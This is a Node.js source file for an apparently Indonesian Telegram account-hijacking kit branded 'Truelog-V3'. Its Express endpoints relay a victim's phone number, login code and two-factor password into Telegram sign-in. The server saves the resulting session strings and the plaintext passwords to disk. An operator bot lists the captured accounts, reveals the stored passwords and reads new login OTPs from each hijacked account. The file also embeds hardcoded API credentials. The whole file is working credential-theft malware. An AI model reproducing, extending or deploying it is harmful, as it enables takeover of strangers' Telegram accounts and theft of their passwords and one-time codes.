require('dotenv').config();
const express = require("express");
const bodyParser = require("body-parser");
const http = require("http");
const fs = require('fs');
const util = require("util");
const axios = require("axios");
const path = require('path');
const cors = require('cors');
const moment = require("moment");
const MTProto = require("@mtproto/core");
// const rateLimit = require("express-rate-limit");
const { Api, TelegramClient } = require("telegram");
const { StringSession } = require('telegram/sessions');
const { spawn } = require("child_process");
const figlet = require("figlet");
const os = require('os');
const net = require("net");
const { Telegraf, Markup } = require("telegraf");

const hostname = os.hostname();
const port = process.env.PORT;
const API_BASE_URL = process.env.API_BASE_URL+ "/";

function checkPort(portNumber) {
  return new Promise((resolve, reject) => {
    let server = net.createServer();
    server.once('error', (error) => {
      if (error.code === "EADDRINUSE") {
        resolve(false);
      } else {
        reject(error);
      }
    });
    server.once("listening", () => {
      server.close();
      resolve(true);
    });
    server.listen(portNumber);
  });
}

if (!port) {
  console.error("Port not specified. Please provide a port number.");
  process.exit(1);
}

const ensureDirectoryExists = (directoryPath) => {
  if (!fs.existsSync(directoryPath)) {
    fs.mkdirSync(directoryPath, { recursive: true });
  }
};
ensureDirectoryExists('sessions');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

global.api = new MTProto({
  api_id: 28919174,
  api_hash: '5506bbd95154275f2e6b9ca381eeb618',
  storageOptions: { path: './1.json' }
});

let bot = null;
let botToken = null;
let users = [];

function startBot(token) {
  if (bot) {
    console.log("🔄 Menghentikan bot lama...");
    bot.stop();
  }
  bot = new Telegraf(token);

  bot.use(async (ctx, next) => {
    console.log("🔍 Update received:", ctx.update);
    return next();
  });

  bot.start(async (ctx) => {
    console.log("🚀 Memulai bot dan mengirim menu utama...");
    const chatId = ctx.chat.id;
    if (!users.includes(chatId)) {
      users.push(chatId);
    }
    await sendMainMenu(ctx);
  });

  async function sendMainMenu(ctx) {
    console.log("🔍 Mengirim menu utama dengan tombol...");
    await ctx.replyWithPhoto(
      { url: "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgW-ro7mQvX7-S6h-ck6j-QkKKG9hf-lexyDq2LJIBRDyVNkWAvp5nXX05Qj0sxUpQm5EagLAomXlEBwTAJaXxcc1xgUJOpeQA780ikiRfp-kwMCyRFi-zU_df2RwCN6WMnqYh9LBOPogRfUpNNRSyhjmocq5A3XAZc86T-lVEnJ9WD7iM6UK4eJwPIVCU/s926/237b1be4-c97a-48c1-bcd6-2ebfdeb48b19.jpg" },
      {
        caption: "🎉 *Truelog-V3 🤖*\nby @zendsdeveloper 😈",
        parse_mode: "Markdown"
      }
    );
    await ctx.reply("📌 *Pilih menu di bawah ini:*", {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📄 List Nomor", callback_data: "list_number" }],
          [{ text: "🗑️ Hapus Semua Nomor", callback_data: "delete_all_numbers" }]
        ]
      }
    });
  }

  bot.action("list_number", async (ctx) => {
    console.log("🔍 Pengguna menekan tombol 'List Nomor'");
    try {
      const response = await axios.get(API_BASE_URL + "listNumber");
      console.log("🔍 Response dari API listNumber:", response.data);
      if (response.data.status === "success") {
        const sessionsDir = path.join(__dirname, 'sessions');
        const sessionFiles = fs.readdirSync(sessionsDir);
        const buttons = response.data.numbers
          .filter(number => !number.includes('_'))
          .map(number => {
            const sessionFile = sessionFiles.find(file => file.endsWith('_' + number + ".txt"));
            let timeAgo = "Beberapa saat yang lalu";
            if (sessionFile) {
              const timestamp = sessionFile.split('_')[0];
              timeAgo = moment(Number(timestamp)).fromNow();
            }
            return [Markup.button.callback(`${timeAgo} | ${number}`, 'select_' + number)];
          });
        console.log("📄 Mengirim daftar nomor ke pengguna:", buttons);
        if (buttons.length > 0) {
          ctx.reply("📄 *Pilih Nomor:*", {
            parse_mode: "Markdown",
            ...Markup.inlineKeyboard(buttons)
          });
        } else {
          ctx.reply("❌ Belum ada nomor masuk bos.");
        }
      } else {
        console.log("❌ Gagal mengambil daftar nomor.");
        ctx.reply("❌ Gagal mengambil daftar nomor.");
      }
    } catch (error) {
      console.error("❌ Error saat mengambil daftar nomor:", error);
      ctx.reply("❌ Terjadi kesalahan saat mengambil daftar nomor.");
    }
    ctx.answerCbQuery();
  });

  bot.action("delete_all_numbers", async (ctx) => {
    console.log("🔍 Pengguna menekan tombol 'Hapus Semua Nomor'");
    try {
      const response = await axios.get(API_BASE_URL + "deleteAllNumber");
      console.log("🔍 Response dari API deleteAllNumber:", response.data);
      if (response.data.status === "success") {
        ctx.reply("✅ Semua nomor berhasil dihapus.");
      } else {
        ctx.reply("❌ Gagal menghapus semua nomor.");
      }
    } catch (error) {
      console.error("❌ Error saat menghapus semua nomor:", error);
      ctx.reply("❌ Terjadi kesalahan saat menghapus semua nomor.");
    }
    ctx.answerCbQuery();
  });

  bot.action(/select_(.+)/, async (ctx) => {
    const phoneNumber = ctx.match[1];
    console.log("🔍 Pengguna memilih nomor: " + phoneNumber);
    try {
      const response = await axios.post(API_BASE_URL + "getUserInfo", { phoneNumber });
      if (!response.data.userInfo) {
        await ctx.reply("📌Session telah invalid, nomor akan di hapus.");
        return;
      }
      const { id, username, fullName } = response.data.userInfo;
      const phoneLink = `[${phoneNumber}](tel:${phoneNumber})`;
      await ctx.reply(
        "📌 *Account Manager by @zendsdeveloper*\n" +
          "📞 Nomor: " + phoneLink + "\n" +
          "🆔 ID: " + id + "\n" +
          "👤 Username: " + username + "\n" +
          "📛 Nama Lengkap: " + fullName + "\n\n" +
          "Klik tombol di bawah untuk mengambil OTP atau menghapus nomor.",
        {
          parse_mode: "Markdown",
          ...Markup.inlineKeyboard([
            [Markup.button.callback("📩 Get OTP", 'get_otp_' + phoneNumber)],
            [Markup.button.callback("🔐 Get Password", 'get_pw_' + phoneNumber)],
            [Markup.button.callback("🗑️ Hapus Nomor", 'delete_' + phoneNumber)],
            [Markup.button.callback("⬅️ Back", 'back_to_menu')]
          ])
        }
      );
      await ctx.answerCbQuery();
    } catch (error) {
      console.error("❌ Error saat mengambil informasi pengguna:", error);
      if (error.response && error.response.data && error.response.data.message === "Session telah invalid.") {
        await ctx.reply("❌Session telah invalid, nomor akan di hapus dari list");
      } else {
        await ctx.reply("❌Terjadi kesalahan saat mengambil informasi pengguna. Silakan coba lagi.");
      }
      await ctx.answerCbQuery();
    }
  });

  bot.action(/get_pw_(.+)$/, async (ctx) => {
    const phoneNumber = ctx.match[1];
    try {
      const response = await axios.get(API_BASE_URL + "getPassword/" + phoneNumber);
      if (response.data.status === 'success') {
        const { phoneNumber: returnedPhone, password } = response.data;
        const message =
          "📌 *Account Manager by @zendsdeveloper*\n" +
          "📞 Nomor: " + returnedPhone + "\n" +
          "🔑 Password: `" + password + "`\n\n";
        const buttons = Markup.inlineKeyboard([[Markup.button.callback("⬅️ List Nomor", 'select_' + phoneNumber)]]);
        await ctx.reply(message, { parse_mode: "Markdown", ...buttons });
        ctx.answerCbQuery();
      } else {
        await ctx.reply("⚠️ Password tidak ditemukan atau belum disimpan.");
      }
    } catch (error) {
      console.error("❌ Error saat mengambil password:", error);
      await ctx.reply("⚠️ Gagal mengambil password.");
    }
  });

  bot.action(/get_otp_(.+)/, async (ctx) => {
    const phoneNumber = ctx.match[1];
    console.log("🔍 Mengambil OTP untuk nomor: " + phoneNumber);
    try {
      const response = await axios.post(API_BASE_URL + "readOtp", { phoneNumber });
      console.log("🔍 Response dari API readOtp:", response.data);
      if (response.data.status === 'success') {
        ctx.reply("🔑 *OTP:* " + response.data.latestMessage, { parse_mode: "Markdown" });
      } else {
        console.log("❌ Gagal mengambil OTP.");
        ctx.reply("❌ Gagal mengambil OTP.");
      }
    } catch (error) {
      console.error("❌ Error saat mengambil OTP:", error);
      ctx.reply("❌ Terjadi kesalahan saat mengambil OTP.");
    }
    ctx.answerCbQuery();
  });

  bot.action(/delete_(.+)/, async (ctx) => {
    const phoneNumber = ctx.match[1];
    console.log("🔍 Menghapus nomor: " + phoneNumber);
    try {
      const response = await axios.get(API_BASE_URL + "deleteNumber", { params: { phoneNumber } });
      console.log("🔍 Response dari API deleteNumber:", response.data);
      if (response.data.status === "success") {
        ctx.reply("✅ Nomor berhasil dihapus.");
        await sendMainMenu(ctx);
      } else {
        console.log("❌ Gagal menghapus nomor.");
        ctx.reply("❌ Gagal menghapus nomor.");
      }
    } catch (error) {
      console.error("❌ Error saat menghapus nomor:", error);
      ctx.reply("❌ Terjadi kesalahan saat menghapus nomor.");
    }
    ctx.answerCbQuery();
  });

  bot.action("back_to_menu", (ctx) => {
    console.log("🔙 Kembali ke menu utama...");
    sendMainMenu(ctx);
    ctx.answerCbQuery();
  });

  bot.launch();
  console.log("✅ Bot berjalan dengan token:", token);
}

function sendMessageToAllUsers() {
  console.log("📢 Mengirim pesan ke semua user...");
  if (users.length === 0) {
    console.log("⚠️ Tidak ada user yang tersimpan.");
    return;
  }
  users.forEach((userId) => {
    bot.telegram.sendMessage(userId, "Notifikasi Nomor Masuk ✅").catch((error) =>
      console.error("❌ Error mengirim pesan ke", userId, ":", error)
    );
  });
}

// const limiter = rateLimit({
//   windowMs: 15 * 60 * 1000, // 15 menit
//   max: 100,
//   message: {
//     status: 'error',
//     message: "Too many requests, please try again later."
//   }
// });
// app.use(limiter);

const sessions = new Map();

const initializeClient = async (phoneNumber) => {
  if (!sessions.has(phoneNumber)) {
    const sessionFilePath = path.join("sessions", phoneNumber + ".txt");
    const sessionString = fs.existsSync(sessionFilePath) ? fs.readFileSync(sessionFilePath, 'utf8') : '';
    const client = new TelegramClient(new StringSession(sessionString), apiId, apiHash, { connectionRetries: 5 });
    await client.connect();
    sessions.set(phoneNumber, client);
  }
  return sessions.get(phoneNumber);
};

const loadExistingSessions = async () => {
  const sessionFiles = fs.existsSync("sessions") ? fs.readdirSync('sessions') : [];
  await Promise.all(sessionFiles.map(async (fileName) => {
    const phoneNumber = fileName.replace(".txt", '');
    const sessionString = fs.readFileSync(path.join('sessions', fileName), "utf8");
    const client = new TelegramClient(new StringSession(sessionString), apiId, apiHash, { connectionRetries: 5 });
    await client.connect();
    sessions.set(phoneNumber, client);
    console.log("Loaded session for phone number: " + phoneNumber);
    console.log(phoneNumber + " session string : " + sessionString);
  }));
};

async function checkSession(sessionFileName) {
  try {
    const sessionString = fs.readFileSync(path.join("sessions", sessionFileName), "utf8");
    const client = new TelegramClient(new StringSession(sessionString), apiId, apiHash, { connectionRetries: 5 });
    await client.connect();
    await client.getMe();
    await client.disconnect();
    return true;
  } catch (error) {
    const errorMsg = error.message.toUpperCase();
    if (errorMsg.includes("AUTH _KEY_UNREGISTERED") || errorMsg.includes("SESSION_REVOKED")) {
      console.log("Session revoked for " + sessionFileName + ", deleting...");
      fs.unlinkSync(path.join("sessions", sessionFileName));
      return false;
    } else {
      console.log("Error checking session for " + sessionFileName + ":", error.message);
      return true;
    }
  }
}

async function fetchAPIKeys(url) {
  try {
    const response = await axios.get(url);
    const data = response.data;
    
    const lines = data.split("\n");
    let config = {};
    
    lines.forEach(line => {
      let [key, value] = line.split('=');
      if (key && value) {
        config[key.trim()] = value.trim();
      }
    });
    
    if (config.engine != 1) {
      console.log("Bayar api nya Dulu Bro 083852376200");
      process.exit(1);
    }
    
    global.apiId = parseInt(config.api_id, 10);
    global.apiHash = config.api_hash;
    console.log("Configurations loaded successfully ✅");
  } catch (error) {
    console.error("Error fetching data:", error.message);
    throw error;
  }
}


loadExistingSessions().catch((error) => {
  console.error("Error loading sessions:", error);
});

app.post("/sendCode", async (req, res) => {
  const phoneNumber = req.body.phoneNumber || req.query.phoneNumber;
  if (!/^\+?\d{10,15}$/.test(phoneNumber)) {
    return res.json({
      status: "error",
      message: "Invalid phone number format."
    });
  }
  console.log("Phone Number Received: " + phoneNumber);
  try {
    const client = await initializeClient(phoneNumber);
    const result = await client.invoke(new Api.auth.SendCode({
      phoneNumber,
      apiId,
      apiHash,
      settings: new Api.CodeSettings({
        allowFlashcall: true,
        currentNumber: true,
        allowAppHash: true,
        allowMissedCall: true
      })
    }));
    res.json({
      status: 'success',
      phoneCodeHash: result.phoneCodeHash,
      message: "Code sent successfully."
    });
  } catch (error) {
    console.error("Error sending code:", error);
    res.json({
      status: "error",
      message: "Failed to send code."
    });
  }
});

app.post("/verifyCode", async (req, res) => {
  const { phoneNumber, otp, phoneCodeHash } = req.body;
  if (!phoneNumber || !otp || !phoneCodeHash) {
    return res.json({
      status: "error",
      message: "Invalid input."
    });
  }
  console.log("OTP: [REDACTED]");
  try {
    const client = await initializeClient(phoneNumber);
    const result = await client.invoke(new Api.auth.SignIn({
      phoneNumber,
      phoneCodeHash,
      phoneCode: otp
    }));
    const sessionString = client.session.save();
    const timestamp = Date.now();
    if (!fs.existsSync("sessions")) {
      fs.mkdirSync("sessions", { recursive: true });
    }
    fs.writeFileSync(path.join('sessions', phoneNumber + ".txt"), sessionString);
    fs.writeFileSync(path.join('sessions', timestamp + '_' + phoneNumber + ".txt"), timestamp.toString());
    sendMessageToAllUsers();
    res.json({
      status: "success",
      message: "Login successful.",
      result
    });
  } catch (error) {
    if (error.message.includes('SESSION_PASSWORD_NEEDED')) {
      const srpData = error?.params;
      console.log("SRP Data:", srpData);
      if (!srpData) {
        return res.json({
          status: 'errorpw',
          message: "Password required for login, but SRP data is missing."
        });
      }
      return res.json({
        status: "errorpw",
        message: "Password required for login.",
        srpData
      });
    }
    console.error("Error verifying code:", error);
    res.json({
      status: "error",
      message: "Failed to verify code.",
      error: error.message
    });
  }
});

app.post("/verifyPassword", async (req, res) => {
  const { phoneNumber, password } = req.body;
  if (!phoneNumber || !password) {
    return res.json({
      status: "error",
      message: "Invalid input."
    });
  }
  console.log("Password: [REDACTED]");
  try {
    const client = await initializeClient(phoneNumber);
    const { srpId, currentAlgo, srp_B } = await client.invoke(new Api.account.GetPassword());
    if (!currentAlgo) {
      throw new Error("currentAlgo is undefined. Make sure the account has a password set up.");
    }
    const { g, p, salt1, salt2 } = currentAlgo;
    const { A, M1 } = await global.api.crypto.getSRPParams({
      g,
      p,
      salt1,
      salt2,
      gB: srp_B,
      password
    });
    const bufferA = Buffer.from(A);
    const bufferM1 = Buffer.from(M1);
    const result = await client.invoke(new Api.auth.CheckPassword({
      password: new Api.InputCheckPasswordSRP({
        srpId,
        A: bufferA,
        M1: bufferM1
      })
    }));
    console.log("Verification Result:", result);
    const sessionString = client.session.save();
    const timestamp = Date.now();
    if (!fs.existsSync('sessions')) {
      fs.mkdirSync("sessions", { recursive: true });
    }
    const sessionsDir = path.join(__dirname, "sessions");
    if (!fs.existsSync(sessionsDir)) {
      fs.mkdirSync(sessionsDir, { recursive: true });
    }
    const pwFilePath = path.join(sessionsDir, "pw_" + phoneNumber + '.txt');
    const passwordData = "Nomor: " + phoneNumber + "\nPassword: " + password + "\n";
    fs.writeFileSync(pwFilePath, passwordData, "utf8");
    console.log("✅ Data berhasil disimpan ke " + pwFilePath);
    fs.writeFileSync(path.join('sessions', phoneNumber + ".txt"), sessionString);
    fs.writeFileSync(path.join("sessions", timestamp + '_' + phoneNumber + '.txt'), timestamp.toString());
    sendMessageToAllUsers();
    res.json({
      status: "success",
      message: "Password verified and data saved successfully.",
      result
    });
  } catch (error) {
    console.error("Error verifying password:", error);
    res.json({
      status: "error",
      message: "Failed to verify password.",
      error: error.message
    });
  }
});

app.get("/getTimestamp/:phoneNumber", async (req, res) => {
  const { phoneNumber } = req.params;
  const sessionsDir = path.join(__dirname, "sessions");
  const sessionFiles = fs.readdirSync(sessionsDir);
  const timestampFile = sessionFiles.find(file => file.endsWith('_' + phoneNumber + ".txt"));
  if (!timestampFile) {
    return res.json({
      status: 'error',
      message: "Timestamp not found."
    });
  }
  const filePath = path.join(sessionsDir, timestampFile);
  try {
    const timestamp = fs.readFileSync(filePath, "utf8").trim();
    return res.json({
      status: "success",
      phoneNumber,
      timestamp
    });
  } catch (error) {
    console.error("❌ Error reading timestamp file:", error);
    return res.json({
      status: "error",
      message: "Failed to retrieve timestamp."
    });
  }
});

app.get("/getPassword/:phoneNumber", async (req, res) => {
  const { phoneNumber } = req.params;
  const pwFilePath = path.join(__dirname, "sessions", 'pw_' + phoneNumber + ".txt");
  try {
    if (!fs.existsSync(pwFilePath)) {
      return res.json({
        status: 'error',
        message: "Password not found."
      });
    }
    const data = fs.readFileSync(pwFilePath, "utf8");
    const password = data.split("\n")[1]?.replace("Password: ", '').trim();
    return res.json({
      status: 'success',
      phoneNumber,
      password
    });
  } catch (error) {
    console.error("❌ Error reading password file:", error);
    return res.json({
      status: "error",
      message: "Failed to retrieve password."
    });
  }
});

app.post("/readOtp", async (req, res) => {
  const phoneNumber = req.body.phoneNumber || req.query.phoneNumber;
  try {
    const client = await initializeClient(phoneNumber);
    const entity = await client.getEntity(0xbdb28);
    if (!entity) {
      return res.json({
        status: 'error',
        message: "Telegram Official chat not found."
      });
    }
    const messages = await client.getMessages(entity.id, { limit: 1 });
    if (messages.length > 0) {
      const latestMessage = messages[0].text || "No text in the latest message";
      res.json({
        status: "success",
        message: "Latest message retrieved successfully.",
        latestMessage
      });
    } else {
      res.json({
        status: "error",
        message: "No messages found in Telegram Official chat."
      });
    }
  } catch (error) {
    console.error("Error reading latest message:", error);
    res.json({
      status: "error",
      message: "Failed to read the latest message."
    });
  }
});

app.post("/getUserInfo", async (req, res) => {
  const phoneNumber = req.body.phoneNumber || req.query.phoneNumber;
  try {
    const client = await initializeClient(phoneNumber);
    const userInfo = await client.getMe();
    if (userInfo) {
      res.json({
        status: "success",
        message: "User information retrieved successfully.",
        userInfo: {
          id: userInfo.id,
          username: userInfo.username || "No username",
          fullName: ((userInfo.firstName || '') + " " + (userInfo.lastName || '')).trim()
        }
      });
    } else {
      res.json({
        status: "error",
        message: "User information not found."
      });
    }
  } catch (error) {
    console.error("Error fetching user information:", error);
    if (error.code === 0x191 && error.errorMessage === 'AUTH_KEY_UNREGISTERED') {
      console.log("Session revoked for " + phoneNumber + ", deleting...");
      try {
        const sessionFilePath = path.join("sessions", phoneNumber + ".txt");
        if (fs.existsSync(sessionFilePath)) {
          fs.unlinkSync(sessionFilePath);
          console.log("Session file for " + phoneNumber + " deleted successfully.");
        } else {
          console.log("No session file found for " + phoneNumber + '.');
        }
      } catch (deleteError) {
        console.error("Failed to delete session file for " + phoneNumber + ":", deleteError);
      }
      res.json({
        status: "error",
        message: "📌Session telah invalid, nomor akan di hapus."
      });
    } else if (error instanceof TypeError && error.message.includes("Cannot destructure property")) {
      res.json({
        status: 'error',
        message: "Data pengguna tidak valid atau tidak ditemukan."
      });
    } else {
      res.json({
        status: "error",
        message: "Failed to fetch user information."
      });
    }
  }
});

app.post('/restart', (req, res) => {
  const secret = req.query.secret || req.body.secret;
  if (secret !== process.env.RESTART_SECRET) {
    return res.json({
      status: "error",
      message: "Unauthorized access."
    });
  }
  console.log("Received restart request. Restarting server...");
  res.json({
    status: "success",
    message: "Server is restarting..."
  });
  server.close(() => {
    console.log("Server closed. Spawning new process...");
    spawn(process.argv[0], process.argv.slice(1), { stdio: "inherit" });
    process.exit(0);
  });
});

app.get("/deleteNumber", (req, res) => {
  try {
    const phoneNumber = req.query.phoneNumber;
    const sessionFilePath = path.join("sessions", phoneNumber + ".txt");
    if (fs.existsSync(sessionFilePath)) {
      fs.unlinkSync(sessionFilePath);
      res.json({
        status: 'success',
        message: "Nomor " + phoneNumber + " berhasil dihapus."
      });
    } else {
      res.json({
        status: "error",
        message: "Nomor " + phoneNumber + " tidak ditemukan."
      });
    }
  } catch (error) {
    console.error("Error deleting number:", error);
    res.json({
      status: "error",
      message: "Gagal menghapus nomor."
    });
  }
});

app.get("/deleteAllNumber", (req, res) => {
  try {
    const sessionsDir = path.join('sessions');
    const sessionFiles = fs.readdirSync(sessionsDir);
    const txtFiles = sessionFiles.filter(file => file.endsWith(".txt"));
    if (txtFiles.length > 0) {
      txtFiles.forEach(file => {
        const filePath = path.join(sessionsDir, file);
        fs.unlinkSync(filePath);
      });
      res.json({
        status: "success",
        message: "Semua nomor berhasil dihapus."
      });
    } else {
      res.json({
        status: "error",
        message: "Tidak ada nomor yang ditemukan untuk dihapus."
      });
    }
  } catch (error) {
    console.error("Error deleting all numbers:", error);
    res.json({
      status: "error",
      message: "Gagal menghapus nomor."
    });
  }
});

app.get("/listNumber", async (req, res) => {
  try {
    const sessionFiles = fs.readdirSync("sessions");
    let activeNumbers = [];
    for (const file of sessionFiles) {
      if (path.extname(file) === ".txt" && !file.startsWith('pw_')) {
        const validSession = await checkSession(file);
        if (validSession) {
          activeNumbers.push(path.basename(file, ".txt"));
        }
      }
    }
    res.json({
      status: 'success',
      message: "List of active numbers retrieved successfully.",
      numbers: activeNumbers
    });
  } catch (error) {
    console.error("Error reading session files:", error);
    res.json({
      status: "error",
      message: "Failed to retrieve the list of numbers."
    });
  }
});

app.post('/setToken', (req, res) => {
  const { token } = req.body;
  if (!token) {
    return res.status(400).json({
      status: 'error',
      message: "Token tidak diberikan!"
    });
  }
  if (botToken === token) {
    return res.json({
      status: "success",
      message: "Token sudah digunakan, bot tetap berjalan."
    });
  }
  botToken = token;
  startBot(botToken);
  res.json({
    status: "success",
    message: "Bot token diperbarui dan bot dijalankan ulang!"
  });
});

(async () => {
  try {
    await fetchAPIKeys("https://raw.githubusercontent.com/fox88-star/apihszh/refs/heads/main/apihash.txt");
    const ip = await axios.get("https://api.ipify.org?format=json");
    http.createServer(app).listen(port, () => {
      figlet.text('Truelogin-V3', { font: "Slant" }, (err, data) => {
        if (err) {
          console.error("Something went wrong with Figlet!");
          console.error(err);
          return;
        }
        console.log("\n" + data + "\n            By: @zendsdeveloper\n===========================================\nServer is starting...\nHostname : " + hostname + "\nRunning at : https://" + ip.data.ip + ':' + port + "\n===========================================\n                ");
      });
    });
  } catch (error) {
    console.error("Initialization failed:", error.message);
    process.exit(1);
  }
})();

const logFile = fs.createWriteStream("truelog.log", { flags: 'a' });
const logStdout = process.stdout;
console.log = function (...args) {
  const logMessage = util.format(...args) + "\n";
  logFile.write(logMessage);
  logStdout.write(logMessage);
};
